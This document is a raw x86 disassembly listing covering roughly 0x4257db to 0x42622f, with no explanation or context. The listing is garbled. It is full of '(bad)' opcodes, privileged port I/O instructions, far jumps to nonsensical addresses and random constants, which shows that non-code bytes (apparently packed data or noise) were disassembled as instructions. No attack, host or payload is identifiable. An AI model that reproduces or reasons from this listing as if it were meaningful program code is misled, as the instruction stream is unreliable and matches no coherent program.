  4257db:	add    DWORD PTR [eax],eax
  4257dd:	lea    esi,[ecx+0x45852d]
	...
  4257ff:	add    BYTE PTR [eax+edi*8+0x15b189c2],cl
  425806:	mov    DWORD PTR [ebp-0x24],esi
  425809:	enter  0x7441,0x76
  42580d:	add    DWORD PTR [eax],eax
  42580f:	add    bh,ch
  425811:	and    DWORD PTR [edi-0x73],ecx
  425814:	xor    eax,ecx
  425816:	dec    esp
  425817:	mov    edi,0x80000165
  42581c:	mov    edi,0x4f0be4c8
  425821:	cmp    ebx,0x12786485
  425827:	add    DWORD PTR [ecx],0x74
  42582a:	cld    
  42582b:	imul   esi,DWORD PTR [eax],0xe4704190
  425831:	ins    DWORD PTR es:[edi],dx
  425832:	add    BYTE PTR [ebx-0x47],dl
  425835:	inc    esi
  425836:	rcl    BYTE PTR [eax+0x7c],0x79
  42583a:	out    0xff,eax
  42583c:	mov    eax,DWORD PTR [ebp+0x4f7b04c2]
  425842:	jo     0x4258b9
  425844:	scas   eax,DWORD PTR es:[edi]
  425845:	ins    DWORD PTR es:[edi],dx
  425846:	inc    edx
  425847:	(bad)  
  425848:	rcl    esp,1
  42584a:	push   esp
  42584b:	call   0x421aa1
  425850:	or     eax,0x608ac941
  425855:	fsub   st,st(7)
  425858:	mov    bh,0x4
  42585a:	add    al,0x0
  42585c:	cwde   
  42585d:	mov    ds:0x68374ff4,eax
  425862:	xor    eax,0xd9
	...
  42587f:	add    BYTE PTR [eax],al
  425881:	add    BYTE PTR [esi-0x24],bl
  425884:	(bad)  
  425885:	rcr    DWORD PTR [ebp-0x42],cl
  425888:	mov    edi,DWORD PTR [edx+0x21]
  42588b:	push   ds
  42588c:	pop    ss
  42588d:	cmp    al,0xfd
  42588f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425890:	add    BYTE PTR [ebx-0x76f06c33],al
  425896:	retf   
  425897:	xchg   esi,eax
  425898:	(bad)  
  425899:	jb     0x42589c
  42589b:	movhlps xmm5,xmm4
  42589e:	xor    BYTE PTR [ebp+0x6d],0x1
  4258a2:	aas    
  4258a3:	daa    
  4258a4:	mov    BYTE PTR [edi+0x428f79f9],bh
  4258aa:	fnstenv [esi]
  4258ac:	pop    DWORD PTR [edx+0x39]
  4258af:	ss (bad) 
  4258b1:	les    esp,FWORD PTR [ebp-0xc]
  4258b4:	push   0xfffffffc
  4258b6:	push   edx
  4258b7:	jmp    0x4258f9
  4258b9:	jae    0x4258e0
  4258bb:	rol    DWORD PTR [edi],1
  4258bd:	mov    ecx,eax
  4258bf:	ss aam 0x69
  4258c2:	adc    esp,ebx
  4258c4:	(bad)  
  4258c5:	dec    ebx
  4258c6:	(bad)  
  4258c8:	(bad)  
  4258c9:	sar    DWORD PTR [ebp+0x356fdfef],cl
  4258cf:	ins    WORD PTR es:[edi],dx
  4258d1:	cld    
  4258d2:	sbb    al,BYTE PTR [eax]
  4258d4:	int3   
  4258d5:	mov    bl,BYTE PTR [eax-0x7c182736]
  4258db:	mov    ebx,0x20770000
  4258e0:	(bad)  
  4258e1:	jb     0x425918
  4258e3:	adc    DWORD PTR [eax+ebp*2+0x0],ebp
	...
  425903:	add    BYTE PTR [ebx],dh
  425905:	add    bh,ah
  425907:	add    esi,DWORD PTR [edi-0x3a]
  42590a:	imul   edi,eax,0x46
  42590d:	fdivr  DWORD PTR [esi]
  42590f:	jecxz  0x425929
  425911:	add    bh,ah
  425913:	nop
  425914:	dec    edi
  425915:	cmp    BYTE PTR [eax-0x38],dh
  425918:	dec    esi
  425919:	xchg   DWORD PTR [esp+ecx*4],esp
  42591c:	dec    edi
  42591d:	enter  0xe05f,0x3e
  425921:	inc    ebx
  425922:	mov    ds:0xe7000ff3,eax
  425927:	add    ebp,DWORD PTR [eax+0x4f9092f5]
  42592d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42592e:	mov    dh,0xed
  425930:	dec    ecx
  425931:	xlat   BYTE PTR ds:[ebx]
  425932:	pop    ebx
  425933:	ror    BYTE PTR [esi],0x7b
  425936:	add    eax,0x46237282
  42593b:	add    ecx,DWORD PTR ds:0xba888fd9
  425941:	cli    
  425942:	stos   DWORD PTR es:[edi],eax
  425943:	in     eax,dx
  425944:	or     al,0x8d
  425946:	arpl   ax,cx
  425948:	enter  0xfd86,0xd4
  42594c:	xchg   edi,eax
  42594d:	test   edx,ebp
  42594f:	sbb    BYTE PTR [ecx+0x7b],0x36
  425953:	mov    esp,0x83e67b53
  425958:	xor    cl,BYTE PTR [ebx]
  42595a:	rol    DWORD PTR [ecx-0x7597abf],1
  425960:	and    edi,DWORD PTR [edi+0x43]
  425963:	lock xor ch,cl
  425966:	jmp    0x0:0x8e
	...
  425985:	add    bh,cl
  425987:	jmp    0x4259bf
  425989:	out    dx,al
  42598a:	push   cs
  42598b:	iret   
  42598c:	arpl   WORD PTR [edi-0x7e7284f2],ax
  425992:	ret    0xfe67
  425995:	ins    DWORD PTR es:[edi],dx
  425996:	or     DWORD PTR [ebx+0x69],edi
  425999:	dec    ecx
  42599a:	push   cs
  42599b:	retf   0xfbff
  42599e:	inc    edi
  42599f:	jl     0x4259e3
  4259a1:	cmc    
  4259a2:	(bad)  
  4259a3:	lds    ebp,FWORD PTR [edi-0x24]
  4259a6:	scas   al,BYTE PTR es:[edi]
  4259a7:	fistp  DWORD PTR [ebp-0x3e]
  4259aa:	mov    DWORD PTR ds:0xce502077,edi
  4259b0:	mov    BYTE PTR ds:0xf15f668e,bh
  4259b6:	push   cs
  4259b7:	add    BYTE PTR [ecx-0x69],dl
  4259ba:	(bad)  
  4259bb:	in     eax,dx
  4259bc:	pop    es
  4259bd:	cli    
  4259be:	pop    ecx
  4259bf:	xchg   BYTE PTR [edx+0x45],dh
  4259c2:	xchg   ch,dl
  4259c4:	sti    
  4259c5:	adc    DWORD PTR [edi-0x751700f3],ebp
  4259cb:	mov    edx,0x79ce6d0c
  4259d0:	cld    
  4259d1:	jmp    0x7441428f
  4259d6:	push   edx
  4259d7:	outs   dx,BYTE PTR ds:[esi]
  4259d8:	dec    edi
  4259d9:	(bad)  
  4259da:	jnp    0x425a3a
  4259dc:	mov    BYTE PTR [esi+eiz*8+0x947fe62],ch
  4259e3:	add    BYTE PTR [ecx-0x1c426427],cl
  4259e9:	jo     0x4259eb
	...
  425a07:	add    BYTE PTR [ebx+0x72],bl
  425a0a:	out    0xba,eax
  425a0c:	add    edi,DWORD PTR [ebx-0x4]
  425a0f:	push   0xffffff8c
  425a11:	jnp    0x425a1f
  425a13:	ins    DWORD PTR es:[edi],dx
  425a14:	daa    
  425a15:	jnp    0x425a13
  425a17:	jmp    0xfa494281
  425a1c:	loopne 0x4259a5
  425a1e:	lds    edx,FWORD PTR [eax]
  425a20:	mov    ah,0x69
  425a22:	cmp    BYTE PTR [ebx-0x16078103],0xe
  425a29:	add    BYTE PTR [edx+0x22],ch
  425a2c:	mov    dh,ch
  425a2e:	jecxz  0x425a61
  425a30:	mov    eax,ds:0xf4003abd
  425a35:	std    
  425a36:	imul   ecx,DWORD PTR [ecx+esi*2+0x7a],0x3b8c58d4
  425a3e:	cmp    DWORD PTR [eax],eax
  425a40:	in     al,0x34
  425a42:	ror    BYTE PTR [ecx-0xcc8fa2f],cl
  425a48:	repz xchg esp,edx
  425a4b:	add    ah,ah
  425a4d:	std    
  425a4e:	xchg   BYTE PTR [ebp-0x14],cl
  425a51:	mov    WORD PTR [ecx-0xc],es
  425a54:	aas    
  425a55:	xor    DWORD PTR [eax-0x7e128677],ecx
  425a5b:	div    BYTE PTR [ebx-0x5bff4b7f]
  425a61:	std    
  425a62:	jg     0x425aa2
  425a64:	mov    ah,0x10
  425a66:	test   BYTE PTR [edi-0x7500024c],ch
	...
  425a88:	add    BYTE PTR [eax],al
  425a8a:	add    BYTE PTR [ebp-0x227e7700],0x81
  425a91:	inc    DWORD PTR [ebx+0x74009c81]
  425a97:	std    
  425a98:	jg     0x425ad9
  425a9a:	adc    BYTE PTR fs:[edi+edx*4-0x7500029c],al
  425aa2:	ror    BYTE PTR [ebx+0x94f8504],1
  425aa8:	test   BYTE PTR [ebx+0x7ffffd64],cl
  425aae:	inc    DWORD PTR [ebx]
  425ab0:	or     eax,DWORD PTR [esi+esi*4-0x48fffffd]
  425ab7:	retf   
  425ab8:	sti    
  425ab9:	push   eax
  425aba:	push   ss
  425abb:	test   edi,eax
  425abd:	call   0x3f02a5
  425ac2:	mov    ecx,0xb13170c3
  425ac7:	inc    esi
  425ac8:	loopne 0x425b1d
  425aca:	or     eax,0x537bd37
  425acf:	add    BYTE PTR [bp+di-0x3940],cl
  425ad4:	je     0x425ad2
  425ad6:	add    cl,BYTE PTR [edi+0x670da633]
  425adc:	fist   DWORD PTR [esi-0x72]
  425adf:	out    dx,al
  425ae0:	jl     0x425b55
  425ae2:	dec    ebx
  425ae3:	out    dx,al
  425ae4:	dec    ebp
  425ae5:	dec    esi
  425ae6:	nop
  425ae7:	stos   DWORD PTR es:[edi],eax
  425ae8:	jl     0x425ad1
  425aea:	cli    
  425aeb:	icebp  
  425aec:	add    eax,DWORD PTR [eax]
	...
  425b0a:	add    BYTE PTR [eax],al
  425b0c:	mov    DWORD PTR [esi],esp
  425b0e:	clc    
  425b0f:	dec    esp
  425b10:	xchg   esi,eax
  425b11:	mov    ebx,0xc7408870
  425b16:	aam    0x55
  425b18:	mov    BYTE PTR [ebx+0x6e724f58],ch
  425b1e:	or     BYTE PTR [eax],al
  425b20:	or     eax,0x9a9fb6f4
  425b25:	sbb    DWORD PTR [ebp-0x19],edi
  425b28:	fwait
  425b29:	retf   
  425b2a:	add    eax,DWORD PTR [eax]
  425b2c:	mov    fs,WORD PTR [edx]
  425b2e:	adc    BYTE PTR [ecx+0x28f80185],al
  425b34:	xchg   esi,eax
  425b35:	sub    bl,dl
  425b37:	mov    cl,al
  425b39:	jb     0x425ba3
  425b3b:	jmp    0x425ad0
  425b3d:	data16 add BYTE PTR [ebp+ecx*2-0x377ee026],al
  425b45:	outs   dx,BYTE PTR ds:[esi]
  425b46:	or     ecx,DWORD PTR [ecx-0x2f76a130]
  425b4c:	push   ss
  425b4d:	and    al,0x7c
  425b4f:	or     al,0x8f
  425b51:	js     0x425bd0
  425b53:	cld    
  425b54:	inc    edx
  425b55:	dec    ebp
  425b56:	or     al,0xfd
  425b58:	shl    BYTE PTR [edx+0x667b3e68],0x0
  425b5f:	xor    DWORD PTR [eax-0x6bfc5d01],0x978a9ec2
  425b69:	jae    0x425be9
  425b6b:	int    0x58
  425b6d:	jmp    esi
  425b6f:	fiadd  WORD PTR [eax]
	...
  425b8d:	add    BYTE PTR [ebp+0x65dd82bd],dl
  425b93:	dec    ecx
  425b94:	test   al,0x7
  425b96:	or     eax,0x856f61cd
  425b9b:	mov    ebp,0x8f684da
  425ba0:	jmp    0x6a1168a8
  425ba5:	inc    ebx
  425ba6:	rcl    BYTE PTR es:[ebp-0x8],1
  425baa:	or     al,BYTE PTR [ebp+0x77c77b63]
  425bb0:	inc    ebp
  425bb1:	rcl    DWORD PTR [ebp-0x3eb3b187],cl
  425bb7:	ja     0x425bee
  425bb9:	mov    BYTE PTR [edx-0x14],dh
  425bbc:	lds    esi,FWORD PTR [ebp+0x51]
  425bbf:	cld    
  425bc0:	call   0x63c7adbc
  425bc5:	jnp    0x425b5e
  425bc7:	ja     0x425bde
  425bc9:	shr    DWORD PTR [edx-0x7681f325],cl
  425bcf:	mov    DWORD PTR [ebx+0x72408e0f],ebp
  425bd5:	aas    
  425bd6:	fmul   st(5),st
  425bd8:	xchg   esi,eax
  425bd9:	jle    0x425bfa
  425bdb:	cmp    al,0xd8
  425bdd:	ret    
  425bde:	push   0xffffff8a
  425be0:	xor    eax,0x6b589410
  425be5:	cmc    
  425be6:	adc    al,BYTE PTR [ebx]
  425be8:	mov    ds:0xe6ad016c,al
  425bed:	add    edx,DWORD PTR [ecx+0x163a40]
	...
  425c0f:	add    BYTE PTR [edi+edi*4-0x2cecff16],dl
  425c16:	push   DWORD PTR [ebp-0x51aff4c6]
  425c1c:	add    al,ah
  425c1e:	adc    eax,0xc3810929
  425c23:	in     eax,dx
  425c24:	pmullw mm1,QWORD PTR [ebx]
  425c27:	xchg   esi,eax
  425c28:	sbb    cl,BYTE PTR [ebx]
  425c2a:	call   0xfcb91e6d
  425c2f:	daa    
  425c30:	in     al,0x6c
  425c32:	inc    esp
  425c33:	in     eax,0xf
  425c35:	in     al,dx
  425c36:	or     esp,DWORD PTR [edx+ecx*4+0x6e]
  425c3a:	cli    
  425c3b:	outs   dx,BYTE PTR ds:[esi]
  425c3c:	push   0xc4f7e7c7
  425c41:	jae    0x425c3f
  425c43:	sbb    dl,BYTE PTR [ecx-0x2c]
  425c46:	(bad)  
  425c47:	sub    eax,DWORD PTR [ecx]
  425c49:	add    BYTE PTR [ebx+0x62],dl
  425c4c:	cmp    eax,0x8e41e380
  425c51:	push   0x4b
  425c53:	jmp    0x425c63
  425c55:	add    BYTE PTR [esi-0x3d],dl
  425c58:	ror    DWORD PTR [ecx-0x27b2fa8d],0xe7
  425c5f:	xor    ah,ah
  425c61:	(bad)  
  425c62:	push   DWORD PTR [ecx+0x53]
  425c65:	mov    cl,BYTE PTR [ebx-0x33]
  425c68:	mov    ch,0x86
  425c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c6c:	xor    cl,BYTE PTR [eax]
  425c6e:	xor    DWORD PTR [ecx],ebp
  425c70:	pop    ecx
  425c71:	(bad)  
  425c72:	imul   ecx,eax,0x0
	...
  425c90:	add    BYTE PTR [eax],al
  425c92:	pop    esi
  425c93:	cmp    eax,DWORD PTR [ebx-0x33]
  425c96:	adc    dl,BYTE PTR [eax]
  425c98:	ja     0x425c43
  425c9a:	push   cs
  425c9b:	jg     0x425cf8
  425c9d:	or     eax,0x5437f29
  425ca2:	and    eax,0x210d437f
  425ca7:	jne    0x425cbb
  425ca9:	xor    DWORD PTR [eax+eax*8],ebx
  425cac:	(bad)  
  425cad:	push   DWORD PTR [ecx-0x21918e3e]
  425cb3:	dec    ebx
  425cb4:	mov    DWORD PTR [eax+eax*1+0x38],esi
  425cb8:	pop    eax
  425cb9:	call   0x429487
  425cbe:	cdq    
  425cbf:	and    BYTE PTR ds:[eax],cl
  425cc2:	popf   
  425cc3:	and    BYTE PTR ds:[eax],bl
  425cc6:	test   eax,0x6d48203e
  425ccb:	cmp    eax,0x3d791c20
  425cd0:	and    BYTE PTR [edi*2+0x6924203d],al
  425cd7:	cmp    eax,0x85044820
  425cdc:	dec    eax
  425cdd:	and    al,0x8
  425cdf:	mov    ebx,0x8102440
  425ce4:	add    BYTE PTR [eax],al
  425ce6:	in     al,0xbc
  425ce8:	inc    eax
  425ce9:	and    al,0xc8
  425ceb:	add    al,BYTE PTR [eax]
  425ced:	add    BYTE PTR [esp+edi*4-0x4bdbc0],dh
  425cf4:	(bad)  
  425cf5:	inc    DWORD PTR [eax]
	...
  425d13:	add    BYTE PTR [ecx+ebp*8+0x1b43924],ah
  425d1a:	xchg   esi,eax
  425d1c:	xchg   BYTE PTR fs:[eax+0x24],al
  425d20:	push   0x32e84c51
  425d25:	jmp    0x425d22
  425d27:	push   ecx
  425d29:	shl    BYTE PTR [eax+0x12],0xf9
  425d2d:	cmp    al,0x20
  425d2f:	dec    eax
  425d30:	xchg   esp,eax
  425d31:	xchg   BYTE PTR [eax+0x24],cl
  425d34:	pop    eax
  425d35:	mov    al,BYTE PTR [eax+0x24]
  425d38:	push   esp
  425d39:	jmp    0x1b6963e
  425d3e:	test   bl,0x66
  425d41:	gs push cs
  425d43:	mov    ecx,DWORD PTR ds:0x96102023
  425d49:	adc    al,0xc
  425d4b:	xchg   DWORD PTR [edx+esi*8],ecx
  425d4e:	mov    edi,0xc6f22123
  425d53:	or     eax,DWORD PTR [eax+ebp*2+0x43088d6]
  425d5a:	inc    esi
  425d5b:	pop    es
  425d5c:	or     eax,0x8eeb8d34
  425d61:	sbb    edi,0x50
  425d64:	mov    ebx,0x9428735
  425d69:	aaa    
  425d6a:	xchg   DWORD PTR [edx-0x7],eax
  425d6d:	push   ss
  425d6e:	out    dx,al
  425d6f:	add    DWORD PTR [esi-0x71],edx
  425d72:	adc    eax,0x34edf2fd
  425d77:	fld    DWORD PTR [eax]
	...
  425d95:	add    BYTE PTR [esp+eax*1],ah
  425d98:	js     0x425e03
  425d9a:	push   eax
  425d9b:	outs   dx,BYTE PTR ds:[esi]
  425d9c:	mov    edi,0xeee3e15a
  425da1:	lahf   
  425da2:	xor    eax,0xd3963bf
  425da7:	addr16 jmp 0xa557:0x6c3b904d
  425daf:	aad    0x3d
  425db1:	add    BYTE PTR ds:0xc68240e2,cl
  425db7:	stos   BYTE PTR es:[edi],al
  425db8:	add    cl,BYTE PTR [ecx+0x4287b6ce]
  425dbe:	ins    DWORD PTR es:[edi],dx
  425dbf:	mov    dh,0xea
  425dc1:	jmp    DWORD PTR [edi+eiz*2]
  425dc4:	jmp    0x82ff:0x269972fe
  425dcb:	jmp    0xf20710f
  425dd0:	loop   0x425d85
  425dd2:	or     eax,0xc65dd967
  425dd7:	pop    ds
  425dd8:	inc    ebp
  425dd9:	push   edx
  425dda:	xchg   esi,eax
  425ddb:	call   edx
  425ddd:	xchg   BYTE PTR [esi+0x37],ah
  425de0:	cmp    dl,dl
  425de2:	mov    ecx,0xd13eae7
  425de7:	add    BYTE PTR [edx+0x7b],ah
  425dea:	xchg   ebp,eax
  425deb:	mov    edx,0x1a86d6
  425df0:	push   0x22
  425df2:	or     eax,0xdf7adeea
  425df7:	push   edi
  425df8:	xchg   esp,eax
  425df9:	mov    BYTE PTR [eax],0x0
	...
  425e18:	and    dh,BYTE PTR [ebp-0x5]
  425e1b:	pop    ds
  425e1c:	or     al,al
  425e1e:	out    0x8e,al
  425e20:	cmp    al,BYTE PTR [esi+0x578f7033]
  425e26:	adc    eax,DWORD PTR [ebx]
  425e28:	aas    
  425e29:	inc    eax
  425e2a:	(bad)  
  425e2b:	lods   eax,DWORD PTR ds:[esi]
  425e2c:	cli    
  425e2d:	jae    0x425e15
  425e2f:	jp     0x425eb0
  425e31:	add    al,0x76
  425e33:	adc    BYTE PTR ds:0x77042711,bl
  425e39:	sub    ch,al
  425e3b:	rol    DWORD PTR [edi-0x2d12d543],1
  425e41:	ret    
  425e42:	sub    al,0xc0
  425e44:	lds    eax,FWORD PTR [ecx]
  425e46:	dec    esi
  425e47:	adc    BYTE PTR [ebp+0xa],bl
  425e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e4b:	add    edx,DWORD PTR [edx-0x3179d513]
  425e51:	add    al,0x60
  425e53:	fmul   st,st(2)
  425e55:	mov    dl,0xe6
  425e57:	adc    ecx,DWORD PTR ds:0xfef86700
  425e5d:	call   DWORD PTR [ebx+0xabd8616]
  425e63:	shl    eax,cl
  425e65:	jb     0x425dfa
  425e67:	outs   dx,DWORD PTR ds:[esi]
  425e68:	sub    ebp,0x901f7aee
  425e6e:	rol    ebx,cl
  425e70:	jb     0x425ed8
  425e72:	(bad)  
  425e73:	(bad)  
  425e75:	in     eax,dx
  425e76:	pop    ss
  425e77:	pop    esp
  425e78:	dec    ebp
  425e79:	inc    edi
  425e7a:	imul   esi,ecx,0x0
	...
  425e98:	add    BYTE PTR [eax],al
  425e9a:	ds je  0x425f0f
  425e9d:	icebp  
  425e9e:	xchg   esi,ebp
  425ea0:	jecxz  0x425e78
  425ea2:	sbb    cl,BYTE PTR [edx+edx*1-0x4080f6d7]
  425ea9:	cmp    al,0x19
  425eab:	jne    0x425ebf
  425ead:	in     eax,dx
  425eae:	sbb    eax,eax
  425eb0:	push   ebx
  425eb2:	retf   
  425eb3:	(bad)  
  425eb4:	(bad)  
  425eb5:	call   0x2ccd70ed
  425eba:	add    eax,0xc481e7d0
  425ebf:	je     0x425ebd
  425ec1:	cmp    BYTE PTR [edi-0x7d7aa579],0x58
  425ec8:	jae    0x425ea4
  425eca:	jne    0x425eba
  425ecc:	repz jb 0x425e81
  425ecf:	add    ch,al
  425ed1:	mov    al,0xba
  425ed3:	jb     0x425ed1
  425ed5:	fs dec ecx
  425ed7:	out    dx,al
  425ed8:	lahf   
  425ed9:	das    
  425eda:	call   0xe76e:0xe25dff77
  425ee1:	jp     0x425e63
  425ee3:	jb     0x425ee1
  425ee5:	imul   edi,DWORD PTR [edx+0x8bbff77],0x35d94289
  425eef:	and    ebp,eax
  425ef1:	push   0x60
  425ef3:	jb     0x425ef1
  425ef5:	arpl   WORD PTR [edx+0x77],sp
  425ef8:	pop    esp
  425ef9:	(bad)  
  425efa:	mov    ecx,0xf5c139
	...
  425f1b:	add    BYTE PTR [esi],cl
  425f1d:	iret   
  425f1e:	mov    BYTE PTR ds:0x6af75e90,al
  425f24:	cmc    
  425f25:	add    DWORD PTR cs:[eax],0xff0812c0
  425f2c:	xchg   edi,eax
  425f2d:	sbb    DWORD PTR [ecx],0x18
  425f30:	inc    esi
  425f31:	ds cld 
  425f33:	push   ebp
  425f34:	jnp    0x425f9c
  425f36:	dec    eax
  425f37:	int3   
  425f38:	daa    
  425f39:	cld    
  425f3a:	xchg   al,bh
  425f3c:	xor    ecx,ebx
  425f3e:	xchg   DWORD PTR [edi],esi
  425f40:	dec    esp
  425f41:	sbb    esi,esi
  425f43:	call   DWORD PTR [ebx+0x7b]
  425f46:	hlt    
  425f47:	inc    DWORD PTR [ebx-0xe]
  425f4a:	cld    
  425f4b:	add    DWORD PTR [esi+edi*8],esp
  425f4e:	xchg   BYTE PTR ds:0x3fc7d8,cl
  425f54:	iret   
  425f55:	mov    ebx,0x6388d24
  425f5a:	das    
  425f5b:	leave  
  425f5c:	sub    eax,0x7a0f1048
  425f61:	out    0xfd,al
  425f63:	push   esp
  425f65:	jl     0x425fe1
  425f67:	adc    al,0xe5
  425f69:	bound  ecx,QWORD PTR [esi]
  425f6b:	mov    ebp,DWORD PTR [edx]
  425f6d:	or     al,0x35
  425f6f:	dec    eax
  425f70:	clc    
  425f71:	popa   
  425f72:	push   es
  425f73:	mov    ebp,DWORD PTR [edx]
  425f75:	and    BYTE PTR [ebp-0x231c2f9],al
  425f7b:	jmp    esp
  425f7d:	test   BYTE PTR [ecx+0x10],al
	...
  425f9c:	add    BYTE PTR [eax],al
  425f9e:	pop    ds
  425f9f:	mov    ebp,0x52d0270
  425fa4:	jg     0x426024
  425fa6:	mov    al,0xf8
  425fa8:	or     eax,DWORD PTR [ebp-0x136]
  425fae:	das    
  425faf:	aas    
  425fb0:	add    al,0xc6
  425fb2:	push   0x71
  425fb4:	std    
  425fb5:	mov    ebp,0x3fb960
  425fba:	pop    edx
  425fbb:	xchg   BYTE PTR [eax+0x24],al
  425fbe:	or     eax,0x2112776b
  425fc3:	jne    0x425f85
  425fc5:	(bad)  
  425fc6:	jnp    0x425fbc
  425fc8:	sbb    BYTE PTR [ebx-0x2d3c537],cl
  425fce:	loopne 0x426022
  425fd0:	sar    ah,1
  425fd2:	fnstcw WORD PTR [edx]
  425fd4:	sbb    al,0x8b
  425fd6:	rol    DWORD PTR [edx],1
  425fd8:	sar    ah,0x1a
  425fdb:	dec    edi
  425fdc:	out    dx,al
  425fdd:	std    
  425fde:	dec    edx
  425fdf:	dec    edx
  425fe0:	int    0x87
  425fe2:	leave  
  425fe3:	cli    
  425fe4:	or     al,0xfd
  425fe6:	pop    esi
  425fe7:	out    dx,al
  425fe8:	sub    al,0xe8
  425fea:	xchg   esp,eax
  425feb:	lods   al,BYTE PTR ds:[esi]
  425fec:	je     0x425fea
  425fee:	xchg   esi,eax
  425fef:	mov    bh,0x80
  425ff1:	std    
  425ff2:	and    dl,BYTE PTR [edx+0x7c]
  425ff5:	mov    ecx,DWORD PTR [edi+eiz*2]
  425ff8:	add    BYTE PTR [eax+0x113a91],al
  425ffe:	sbb    ah,bl
  426000:	xchg   edx,eax
  426001:	inc    BYTE PTR [eax]
	...
  42601f:	add    BYTE PTR [edx],al
  426021:	addr16 jmp 0x2fa8861c
  426027:	shl    DWORD PTR fs:0x43518b04,0x1c
  42602f:	push   eax
  426030:	retf   
  426031:	sbb    BYTE PTR [eax],al
  426033:	add    dl,bl
  426035:	adc    DWORD PTR [ebp+ebx*1+0x5],ebp
  426039:	push   0x3598b00
  42603e:	sub    BYTE PTR [edi-0x6c],cl
  426041:	call   0xfee6:0x6186241c
  426048:	inc    edx
  426049:	iret   
  42604a:	pop    eax
  42604b:	push   es
  42604c:	or     al,0x67
  42604e:	mov    eax,DWORD PTR [ebx-0x17]
  426051:	dec    BYTE PTR [eax+0x6ffffd45]
  426057:	shr    dh,0x37
  42605a:	jb     0x42601a
  42605c:	push   ds
  42605d:	sub    eax,0x1bce8d32
  426062:	retf   
  426063:	cmp    al,0xd9
  426065:	sbb    eax,edi
  426067:	push   es
  426068:	mov    DWORD PTR [eax-0x7cf2fc1a],ebx
  42606e:	stos   BYTE PTR es:[edi],al
  42606f:	pop    ds
  426070:	sub    eax,0x898bfed0
  426075:	jo     0x42605c
  426077:	jg     0x42600b
  426079:	add    BYTE PTR [ebx-0x70],ah
  42607c:	dec    edx
  42607d:	jo     0x426065
  42607f:	jmp    0x6c57d1a7
	...
  4260a0:	add    BYTE PTR [eax],al
  4260a2:	int    0x7
  4260a4:	call   0x1b9e4ac
  4260a9:	jnp    0x426049
  4260ab:	push   ss
  4260ac:	dec    ebp
  4260ad:	cmp    eax,0x76dcec00
  4260b2:	sahf   
  4260b3:	sbb    ebx,ebx
  4260b5:	jbe    0x426055
  4260b7:	sbb    edx,ebx
  4260b9:	into   
  4260ba:	repnz mov bl,0xe5
  4260bd:	add    al,0xd
  4260bf:	xlat   BYTE PTR ds:[ebx]
  4260c0:	jle    0x4260e7
  4260c2:	mov    edi,0x7e76e700
  4260c7:	and    al,0xc7
  4260c9:	mov    cl,BYTE PTR [esi+0x24]
  4260cc:	mov    edi,0x4f34ead2
  4260d1:	add    ecx,DWORD PTR ds:0xf51faa79
  4260d7:	sub    ch,BYTE PTR [edx]
  4260d9:	out    dx,eax
  4260da:	popa   
  4260db:	test   al,0xe6
  4260dd:	adc    ecx,DWORD PTR ds:0xeebf6000
  4260e3:	or     ecx,DWORD PTR [edi+0x4e]
  4260e6:	arpl   WORD PTR [eax],ax
  4260e8:	out    0x8a,eax
  4260ea:	mov    ds:0xb232002b,al
  4260ef:	sub    DWORD PTR [ebx+0x500bfaa5],ecx
  4260f5:	mov    esi,0xc923f31b
  4260fa:	dec    ebx
  4260fb:	add    al,0x50
  4260fd:	jmp    0xf53f6110
  426102:	cli    
  426103:	adc    DWORD PTR [eax-0x17],eax
	...
  426122:	add    BYTE PTR [eax],al
  426124:	lea    ebp,[edi-0x3b681c8d]
  42612a:	pop    es
  42612b:	mov    dl,0xcf
  42612d:	repnz adc BYTE PTR [edi-0x88bf7e7],al
  426134:	fptan  
  426136:	and    edx,DWORD PTR ds:0x1d23f2c0
  42613c:	pop    ecx
  42613d:	addr16 dec esp
  42613f:	fimul  WORD PTR [edi]
  426141:	add    BYTE PTR [ebp-0x2f],dl
  426144:	(bad)  
  426145:	popf   
  426146:	(bad)  
  426147:	call   0xd16653ed
  42614c:	mov    dh,0xad
  42614e:	scas   al,BYTE PTR es:[edi]
  42614f:	jmp    0xcdb5ce62
  426154:	out    dx,al
  426155:	push   edi
  426156:	mov    bh,0x58
  426158:	adc    DWORD PTR [eax],eax
  42615a:	std    
  42615b:	sbb    eax,0x3ee8182d
  426160:	mov    esi,0xcd72fc6e
  426165:	and    dh,BYTE PTR [eax]
  426167:	jo     0x426114
  426169:	push   ss
  42616a:	mov    DWORD PTR ds:0x2787342d,ebp
  426170:	cmc    
  426171:	js     0x4261b8
  426173:	add    eax,0xd5fc768c
  426178:	ficom  WORD PTR [edi]
  42617a:	inc    esi
  42617b:	or     DWORD PTR [esi+esi*2-0x1673ee8d],edx
  426182:	pop    es
  426183:	add    BYTE PTR [ebp+ebx*2+0x680e],ah
	...
  4261a6:	mov    ah,0x12
  4261a8:	add    BYTE PTR [eax],al
  4261aa:	sbb    al,0x4
  4261ac:	and    BYTE PTR [eax],al
  4261ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261af:	fcmovbe st,st(6)
  4261b1:	cmp    DWORD PTR [edx+eax*1+0x29784585],esp
  4261b8:	jns    0x4261c6
  4261ba:	imul   eax,DWORD PTR [eax+0x79],0xc
  4261be:	out    0x76,eax
  4261c0:	add    al,0x0
  4261c2:	lock ja 0x4641ce0f
  4261c9:	and    BYTE PTR [ebx+0x6c75fb52],al
  4261cf:	ficom  DWORD PTR [ebp-0x2fd9b4f]
  4261d5:	jge    0x4261eb
  4261d7:	jns    0x42621a
  4261d9:	adc    BYTE PTR [ecx-0x52fd8f3e],dh
  4261df:	sub    al,bl
  4261e1:	inc    esp
  4261e2:	add    BYTE PTR [eax],dl
  4261e4:	std    
  4261e5:	push   DWORD PTR [edx+eax*1]
  4261e8:	push   0xfc3f684c
  4261ed:	inc    BYTE PTR [ecx+0x16]
  4261f0:	adc    al,BYTE PTR [eax+0x24]
  4261f3:	ja     0x426235
  4261f5:	and    al,0x0
  4261f7:	push   ebp
  4261f8:	pop    edx
  4261f9:	pop    ebx
  4261fa:	outs   dx,DWORD PTR ds:[esi]
  4261fb:	into   
  4261fc:	pop    ecx
  4261fd:	ret    0x200
  426200:	cmp    BYTE PTR [eax+eax*8+0x10],0x0
  426205:	je     0x4261f6
  426207:	hlt    
  426208:	jo     0x42622e
	...
  426226:	add    BYTE PTR [eax],al
  426228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426229:	fstp   DWORD PTR ds:0x7f01e4b1
  42622f:	(bad)  
